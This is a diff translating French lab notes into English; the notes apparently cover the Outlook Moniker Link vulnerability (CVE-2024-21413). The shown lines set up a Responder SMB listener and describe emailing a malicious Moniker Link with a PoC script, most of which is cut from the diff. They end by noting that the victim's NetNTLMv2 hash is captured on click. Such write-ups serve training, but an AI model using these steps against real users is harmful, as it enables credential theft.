@@ -2,13 +2,13 @@
 
 ## Moniker Link (CVE-2024-21413)
 
-Créer un écouteur SMB sur notre attaque machine
+Create an SMB listener on our attack machine
 
 ```sh
 sudo responder -I eth0
 ```
 
-Envoyer un lien Moniker Link (voir le PoC )
+Send a Moniker Link (see the PoC)
 
 ```python
 '''
@@ -58,6 +58,6 @@ finally:
     server.quit()
 ```
 
-Le script affichera `Email delivered` lorsque l'e-mail aura été envoyé. 
+The script will display `Email delivered` when the email has been sent. 
 
-Et une fois quel aura cliquer sur le lien nous receverons son hash NetNTMLv2
+And once they click on the link we will receive their NetNTMLv2 hash
